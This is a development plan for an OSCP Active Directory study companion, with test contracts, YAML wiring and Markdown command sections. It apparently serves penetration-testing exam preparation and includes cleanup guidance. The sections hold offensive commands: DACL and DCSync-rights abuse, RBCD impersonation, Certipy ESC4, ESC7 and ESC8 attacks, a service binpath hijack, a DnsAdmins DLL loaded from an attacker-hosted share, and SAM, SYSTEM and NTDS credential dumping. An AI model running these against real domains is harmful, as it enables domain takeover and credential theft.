# AD Perfection Pass Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Close the remaining recurring OSCP AD escalation gaps so ACL abuse, RBCD, AD CS variants, privileged-group escalation, and NTDS collection have guarded command paths in the companion.

**Architecture:** Keep the existing parser/UI. Add fenced command groups under stable Markdown headings, extend the AD content contract so those headings must exist, then rewire `content/_playbooks/active-directory.yaml` so each escalation branch uses the new groups without turning optional advanced paths into default recommendations.

**Tech Stack:** Markdown content, YAML playbooks, Vitest content tests, existing Playwright suite.

## Global Constraints

- OSCP-only scope.
- Keep Domain/IP/Username/Password plus shared My IP as the only profile fields; new object-specific values remain advanced placeholders.
- Do not add a shared port variable; ports stay literal.
- Every playbook `commands` reference must point at a fenced command block.
- State-changing AD operations need explicit evidence and cleanup/restore guidance.
- Prefer tools already installed by `content/_setup.yaml`; if a new tool is required, add setup in the same task.
- Preserve the offline single-file build and current storage schema.

---

### Task 1: Add failing AD perfection contracts

**Files:**

- Modify: `src/ad-companion.content.test.ts`

**Interfaces:**

- Produces heading IDs consumed by Tasks 2-4.

- [ ] **Step 1: Extend the consolidated command test**

Add these exact expected references to the existing `uses consolidated enumeration, access, dumping, and pivot command groups` assertion:

```ts
'active-directory/attack-paths#acl-abuse-operations',
'active-directory/attack-paths#resource-based-constrained-delegation',
'active-directory/attack-paths#esc4-template-modification',
'active-directory/attack-paths#esc7-ca-management',
'active-directory/attack-paths#esc8-relay-conditions',
'active-directory/attack-paths#certificate-schannel-fallback',
'windows/windows-privesc#server-operators-service-control',
'windows/windows-privesc#dnsadmins-plugin-dll',
'windows/windows-privesc#backup-operators-registry-and-ifm',
'active-directory/credential-dumping#ntds-and-backup-collection',
```

- [ ] **Step 2: Add a scenario coverage test**

Append this test:

```ts
it('covers high-value AD escalation and cleanup branches', () => {
  expect(playbook?.nodes.path?.commands).toContain('active-directory/attack-paths#acl-abuse-operations')
  expect(playbook?.nodes.delegate?.commands).toContain(
    'active-directory/attack-paths#resource-based-constrained-delegation',
  )
  expect(playbook?.nodes.certificates?.commands).toEqual(
    expect.arrayContaining([
      'active-directory/attack-paths#esc4-template-modification',
      'active-directory/attack-paths#esc7-ca-management',
      'active-directory/attack-paths#esc8-relay-conditions',
    ]),
  )
  expect(playbook?.nodes['certificate-request']?.links).toContain(
    'active-directory/attack-paths#certificate-schannel-fallback',
  )
  expect(playbook?.nodes.privesc?.commands).toEqual(
    expect.arrayContaining([
      'windows/windows-privesc#server-operators-service-control',
      'windows/windows-privesc#dnsadmins-plugin-dll',
      'windows/windows-privesc#backup-operators-registry-and-ifm',
    ]),
  )
  expect(playbook?.nodes.dump?.commands).toContain(
    'active-directory/credential-dumping#ntds-and-backup-collection',
  )
})
```

- [ ] **Step 3: Run it red**

Run: `npx vitest run src/ad-companion.content.test.ts`
Expected: FAIL because the new headings are not referenced yet.

---

### Task 2: Add AD attack-path command groups

**Files:**

- Modify: `content/active-directory/attack-paths.md`

**Interfaces:**

- Produces:
  - `active-directory/attack-paths#acl-abuse-operations`
  - `active-directory/attack-paths#resource-based-constrained-delegation`
  - `active-directory/attack-paths#esc4-template-modification`
  - `active-directory/attack-paths#esc7-ca-management`
  - `active-directory/attack-paths#esc8-relay-conditions`
  - `active-directory/attack-paths#certificate-schannel-fallback`

- [ ] **Step 1: Add ACL operations immediately after `ACL abuse`**

````md
## ACL abuse operations

Read the DACL first. Use the narrowest state-changing operation supported by the verified edge, and save enough evidence to restore the original state.

```bash
# Read the target DACL
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action read
# If WriteOwner is confirmed
impacket-owneredit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -new-owner '{{USER}}' -action write
# If WriteDacl is confirmed
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{TARGET_USER}}' -principal '{{USER}}' -action write -rights ResetPassword
# DCSync rights against the domain root, only when the objective requires it
impacket-dacledit -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -target '{{DOMAIN_DN}}' -principal '{{USER}}' -action write -rights DCSync
```
````

Reset a target password only after the required right is verified:

```bash
impacket-changepasswd -reset -protocol smb-samr '{{DOMAIN}}/{{TARGET_USER}}'@'{{DC}}' -newpass '{{NEW_PASS}}' -altuser '{{DOMAIN}}/{{USER}}' -altpass '{{PASS}}'
```

Record the original DACL or object state, the changed principal, target object, exact right, and cleanup requirement. [Impacket dacledit](https://github.com/fortra/impacket/blob/master/examples/dacledit.py), [Impacket owneredit](https://github.com/fortra/impacket/blob/master/examples/owneredit.py), [Impacket changepasswd](https://github.com/fortra/impacket/blob/master/examples/changepasswd.py).

````

- [ ] **Step 2: Add RBCD operations immediately after `Delegation prerequisites`**

```md
## Resource-based constrained delegation

Use only after confirming write access to the target computer and a controlled machine account or machine-account quota. These operations modify AD.

```bash
# Create a controlled computer account when quota permits
impacket-addcomputer -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -computer-name 'FAKE01$' -computer-pass '{{COMPUTER_PASS}}'
# Allow the controlled account to impersonate users on the target
impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action write
# Request a ticket for the intended identity
impacket-getST -dc-ip '{{DC}}' -spn 'cifs/{{TARGET_COMPUTER}}.{{DOMAIN}}' -impersonate '{{TARGET_USER}}' '{{DOMAIN}}/FAKE01$:{{COMPUTER_PASS}}'
export KRB5CCNAME='{{TARGET_USER}}.ccache'
nxc smb '{{TARGET_COMPUTER}}' -k --kdcHost '{{DC}}' -u '{{TARGET_USER}}' -p '{{PASS}}'
````

Verify the ticket and resulting identity. Remove the RBCD entry when required:

```bash
impacket-rbcd -dc-ip '{{DC}}' '{{DOMAIN}}/{{USER}}:{{PASS}}' -delegate-from 'FAKE01$' -delegate-to '{{TARGET_COMPUTER}}$' -action remove
```

[Impacket addcomputer](https://github.com/fortra/impacket/blob/master/examples/addcomputer.py), [Impacket rbcd](https://github.com/fortra/impacket/blob/master/examples/rbcd.py), [Impacket getST](https://github.com/fortra/impacket/blob/master/examples/getST.py).

````

- [ ] **Step 3: Add AD CS variant sections before `Shadow credentials with Certipy`**

```md
## ESC4 template modification

Use only when the current principal has verified write access to the template. Save the current template before changing it and restore it when required.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -save-configuration '{{TEMPLATE}}.json'
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-default-configuration -force
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}'
certipy template -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -template '{{TEMPLATE}}' -write-configuration '{{TEMPLATE}}.json' -force
````

## ESC7 CA management

Use only when CA manager or certificate-manager rights are verified. Request approval and cleanup requirements before changing CA state.

```bash
certipy find -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -enabled -vulnerable -text
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -list-templates
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -add-officer '{{USER}}'
certipy ca -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -ca '{{CA}}' -enable-template '{{TEMPLATE}}'
certipy req -u '{{USER}}@{{DOMAIN}}' -p '{{PASS}}' -dc-ip '{{DC}}' -target '{{CA_HOST}}' -ca '{{CA}}' -template '{{TEMPLATE}}' -upn '{{TARGET_USER}}@{{DOMAIN}}'
```

## ESC8 relay conditions

Use only after confirming Web Enrollment, a relay-capable authentication trigger, signing/channel-binding state, and an authorized objective. Avoid running another SMB listener on the same interface as the relay.

```bash
sudo certipy relay -target 'http://{{CA_HOST}}' -template Machine -interface '{{LHOST}}'
# Trigger authentication from the target with the confirmed MSSQL, RPC, or web mechanism.
```

A relayed certificate is not access by itself; authenticate with it and verify the resulting identity. [Certipy command reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).

## Certificate Schannel fallback

When PKINIT fails but the certificate is valid, test Schannel authentication to LDAP instead of repeating the same request.

```bash
certipy cert -pfx '{{TARGET_USER}}.pfx' -nokey -out '{{TARGET_USER}}.crt'
certipy cert -pfx '{{TARGET_USER}}.pfx' -nocert -out '{{TARGET_USER}}.key'
certipy auth -pfx '{{TARGET_USER}}.pfx' -dc-ip '{{DC}}' -ldap-shell
```

If Schannel works, perform only the required LDAP operation and verify the resulting identity. [Certipy auth](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference).

````

- [ ] **Step 4: Run focused content validation**

Run: `npx vitest run src/content.check.test.ts`
Expected: PASS for links and fenced commands; the AD contract remains red until Task 4.

---

### Task 3: Add privileged-group and NTDS command groups

**Files:**
- Modify: `content/windows/windows-privesc.md`
- Modify: `content/active-directory/credential-dumping.md`

**Interfaces:**
- Produces:
  - `windows/windows-privesc#server-operators-service-control`
  - `windows/windows-privesc#dnsadmins-plugin-dll`
  - `windows/windows-privesc#backup-operators-registry-and-ifm`
  - `active-directory/credential-dumping#ntds-and-backup-collection`

- [ ] **Step 1: Add privileged-group sections after `Privilege escalation decision`**

```md
## Server Operators service control

Requires membership in Server Operators and a service the group can control. Validate the service name and current configuration before changing it.

```cmd
sc.exe config '{{SERVICE}}' binpath= "cmd /c {{COMMAND}}"
net start '{{SERVICE}}'
````

Use a command that proves the resulting identity or returns useful output. Restore the original binary path when the objective requires it. [Microsoft sc config](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config).

## DnsAdmins plugin DLL

Requires DnsAdmins membership or equivalent DNS service control. Host the DLL on a reachable share, validate the target DNS service, and expect a service restart to be required.

```cmd
dnscmd.exe /config /serverlevelplugindll '\\{{LHOST}}\share\dnsplugin.dll'
net stop dns
net start dns
```

Trigger a DNS operation that loads the plugin and verify the result. Remove the plugin configuration and restore DNS when required. [Microsoft dnscmd](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc772069(v=ws.11)>).

## Backup Operators registry and IFM

Requires Backup Operators membership or equivalent backup rights. Save registry hives first; use IFM only when NTDS collection is authorized and disk space permits.

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
ntdsutil.exe "activate instance ntds" "ifm" "create full C:\Windows\Temp\IFM" quit quit
```

Download the hives or IFM files, then run secretsdump locally. Remove staged files when required. [Microsoft reg save](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save), [Microsoft ntdsutil ifm](<https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732530(v=ws.11)>).

````

- [ ] **Step 2: Add NTDS collection after `Secretsdump cheat sheet`**

```md
## NTDS and backup collection

Use when administrator or backup rights permit host-side collection. Prefer the least destructive source and record where every file came from.

```cmd
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive
ntdsutil.exe "activate instance ntds" "ifm" "create full C:\Windows\Temp\IFM" quit quit
````

```bash
impacket-secretsdump -sam sam.hive -system system.hive -security security.hive LOCAL
impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL
```

A live IFM path can also be copied back for offline parsing. Verify the recovered hashes against the intended hosts before reuse.

```

- [ ] **Step 3: Run focused content validation**

Run: `npx vitest run src/content.check.test.ts`
Expected: PASS.

---

### Task 4: Rewire the AD companion escalation branches

**Files:**
- Modify: `content/_playbooks/active-directory.yaml`

**Interfaces:**
- Consumes all headings from Tasks 2-3.
- Produces the graph expected by Task 1.

- [ ] **Step 1: Update node references and prose**

Use these exact wiring changes:
- `path.commands` becomes `[active-directory/attack-paths#acl-abuse-operations, active-directory/attack-paths#shadow-credentials-with-certipy]`
- `path.links` becomes `[active-directory/attack-paths#acl-abuse, active-directory/attack-paths#gpo-permissions]`
- `delegate.commands` becomes `[active-directory/attack-paths#resource-based-constrained-delegation]`
- `delegate.links` stays `[active-directory/attack-paths#delegation-prerequisites]`
- `certificates.commands` becomes `[active-directory/attack-paths#enumerate-ad-cs-with-certipy, active-directory/attack-paths#esc4-template-modification, active-directory/attack-paths#esc7-ca-management, active-directory/attack-paths#esc8-relay-conditions]`
- `certificate-request.links` becomes `[active-directory/attack-paths#ad-cs-enrollment-prerequisites, active-directory/attack-paths#certificate-strong-mapping-after-2025, active-directory/attack-paths#certificate-schannel-fallback]`
- `privesc.commands` adds the three new group headings before the existing service/task ACL headings.
- `dump.commands` adds `active-directory/credential-dumping#ntds-and-backup-collection` after `secretsdump-cheat-sheet`.

Update node prose:
- `path.body`: `Identify the controlled principal, target object and effective right. Read the DACL first, choose the narrowest supported operation, confirm the result and record a cleanup path.`
- `delegate.body`: `For RBCD, confirm target-computer write access, machine-account quota or an existing controlled computer, then configure delegation, request a ticket and verify the identity.`
- `certificates.body`: `Enumerate CAs and templates, then choose only the ESC path whose prerequisites are verified: subject control, template write, CA management or relay conditions.`
- `certificate-request.body`: `Request the authorized certificate, authenticate with it, and test Schannel when PKINIT fails. The objective is verified access, not merely a PFX.`
- `privesc.body`: `Match the lead to a concrete path: service control, DNS plugin loading, backup rights, token impersonation, or a writable service/task dependency.`
- `dump.body`: `Use the secretsdump source matching your access: remote admin, DCSync rights, local hives, NTDS/IFM or LAPS. Keep each credential tied to its source host and authority.`

- [ ] **Step 2: Run the focused tests**

Run: `npx vitest run src/ad-companion.content.test.ts src/content.check.test.ts`
Expected: PASS.

---

### Task 5: Verify and review

**Files:**
- No new files expected.
- Cleanup: remove Playwright `test-results` if generated and not ignored.

- [ ] **Step 1: Run full verification**

Run: `npm run verify`
Expected: formatting, lint, unit/content tests, build, and browser tests pass.

- [ ] **Step 2: Review the final diff**

Run: `git status --short && git diff --stat`
Expected: only AD content, AD tests, setup if needed, and this plan are modified.

- [ ] **Step 3: Stale wording sweep**

Run: `grep -R "TODO: verify the exact abuse command\|Commands absent\|other ESC classes remain" content docs src`
Expected: no stale gap notes remain unless intentionally preserved in historical research docs.

- [ ] **Step 4: Commit only if the user asks**

Do not commit unless explicitly requested.
```
